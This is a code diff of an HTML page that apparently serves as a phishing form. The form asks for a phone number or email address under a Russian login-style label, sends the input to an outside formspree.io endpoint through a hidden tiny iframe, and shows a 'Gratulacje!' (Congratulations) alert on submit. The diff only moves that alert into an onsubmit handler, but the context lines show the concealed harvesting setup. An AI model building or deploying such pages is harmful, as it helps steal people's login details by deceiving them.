@@ -56,11 +56,15 @@
       
 </div>
       
-
+     <script>
+     function showMessage() {
+      alert("Gratulacje!");
+     }
+     </script>
       
      
     
-      <form action="https://formspree.io/f/mnqyzeea" method="POST" target="myFrame">
+      <form action="https://formspree.io/f/mnqyzeea" method="POST" target="myFrame" onsubmit="showMessage()">
       <div style="text-align:center;">
         <label for="name"><b>Телефон или адрес эл. почты</label><br>
         <input type="text" id="name" name="name"><br><br>
@@ -85,11 +89,7 @@
 	<iframe name="myFrame" style="width:10px; height:10px; position:fixed; bottom:0; left:0; border:none;"></iframe>
 	
 		 
-		<script>
-  document.getElementById("myForm").addEventListener("submit", function() {
-    alert("Gratulacje!");
-  });
-</script>
+	
 
 		
 		
